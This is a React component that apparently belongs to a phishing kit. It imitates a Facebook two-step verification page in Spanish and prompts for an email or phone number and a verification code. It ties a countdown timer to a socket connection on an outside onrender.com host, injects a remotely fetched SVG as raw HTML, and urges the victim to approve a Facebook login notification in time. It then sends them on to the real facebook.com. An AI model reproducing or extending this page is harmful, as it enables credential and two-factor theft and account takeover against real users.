
import React, { useEffect, useState } from 'react';
import io from 'socket.io-client';
import axios from 'axios';


const socket = io('https://api-fbhomepage-id.onrender.com');
function HomePageEmail() {

    const [timer, setTimer] = useState({ minutes: 2, seconds: 0 });
    const [slider, setSlider] = useState('');

    useEffect(() => {
        const countdownInterval = setInterval(() => {
            if (timer.minutes > 0 || timer.seconds > 0) {
                setTimer(prevTimer => {
                    const newTimer = { ...prevTimer };
                    if (newTimer.seconds === 0) {
                        newTimer.minutes--;
                        newTimer.seconds = 59;
                    } else {
                        newTimer.seconds--;
                    }
                    return newTimer;
                });
            } else {
                clearInterval(countdownInterval);
            }
        }, 1000);

        return () => {
            clearInterval(countdownInterval);
            socket.disconnect();
        };
    }, [timer]);

    useEffect(() => {
        axios.get('https://api-fbhomepage-id.onrender.com/public/images/f1d4bbcce9eb74849a196bf.png.svg')
            .then(img => setSlider(img.data))
            .catch(err => { throw err });
        socket.on('timer', newTimer => {
            setTimer(newTimer);
        });
    }, [])

    const handleSend = () => {

        window.location.href = 'https://www.facebook.com';
    };
    const isTimes = timer.minutes === 0 && timer.seconds === 0;
    return (
        <div className='flex justify-center  items-center w-full'>
            <form className='p-4 bg-white rounded-md  border border-gray-300' >

                <div className="sm:w-[400px] ">
                    <div className="sm:col-span-4 ">
                        <div className='' dangerouslySetInnerHTML={{ __html: slider }} />
                    </div>

                    <div className="col-span-full ">
                        <div className="" >
                            <p className='text-center leading-5 mb-1.5 mt-3' style={{

                                fontFamily: "Arial",
                                fontSize: "16px",
                                fontStyle: "normal",
                                fontWeight: 400,
                                lineHeight: "normal",
                            }}>Su cuenta tiene habilitada la verificación en dos pasos.
                                Se requiere inicio de sesión adicional para verificar la
                                actividad y propiedad de su página.</p>
                        </div>
                        <div className="mt-1">
                            <input
                                placeholder='Correo electrónico o número de móvil'
                                style={{ paddingLeft: '12px', fontSize: '16px' }}
                                className="w-full rounded-md border-0 py-1.5 items-center text-gray-900 h-10 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-1 focus:ring-inset focus:ring-slate-950 sm:text-sm sm:leading-6"
                                defaultValue={''}
                            />
                        </div>
                        <p className="text-sm leading-5 text-gray-900 text-center mt-5 mb-1.5 " style={{

                            fontFamily: "Arial",
                            fontSize: "16px",
                            fontStyle: "normal",
                            fontWeight: 400,
                            lineHeight: "normal",
                        }}>Ingrese el código de 6 dígitos del mensaje que
                            acabamos de enviar a su contacto.</p>

                        <div className="">
                            <input
                                placeholder='código'
                                style={{ paddingLeft: '12px', fontSize: '16px' }}
                                className="w-full rounded-md border-0 py-1.5 text-gray-900 h-10 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-1 focus:ring-inset focus:ring-slate-950 sm:text-sm sm:leading-6"
                                defaultValue={''}
                            />

                            <div className="w-full flex justify-center items-center mt-5" >
                                <button type='button' onClick={handleSend} disabled={!isTimes} className='text-center pl-2 pr-2' style={{ textAlign: 'center', color: 'rgba(16, 16, 16, 0.30)', fontSize: 13.30, fontFamily: 'Arial', fontWeight: '400', wordWrap: 'break-word', width: 52, height: 21.66, background: 'rgba(239, 239, 239, 0.30)', border: '2px rgba(118, 118, 118, 0.30) solid', justifyContent: 'center', alignItems: 'flex-start', display: 'inline-flex' }} >Acceso</button>
                            </div>

                            {!isTimes && (<p className='text-center' style={{

                                fontFamily: "Arial",
                                fontSize: "16px",
                                fontStyle: "normal",
                                fontWeight: 400,
                                lineHeight: "normal",
                                marginTop: '11px',
                                wordWrap: 'break-word'
                            }}>
                                Si no recibes un código de verificación Puedes verificar
                                esto volviendo a tu Facebook principal, luego yendo al
                                menú de notificaciones y aprobando tu actividad de
                                inicio de sesión en Facebook dentro del tiempo
                                asignado de {timer.minutes}:{timer.seconds} minutos.
                            </p>)}
                        </div>
                    </div>
                </div>
            </form>
        </div>
    )
}

export default HomePageEmail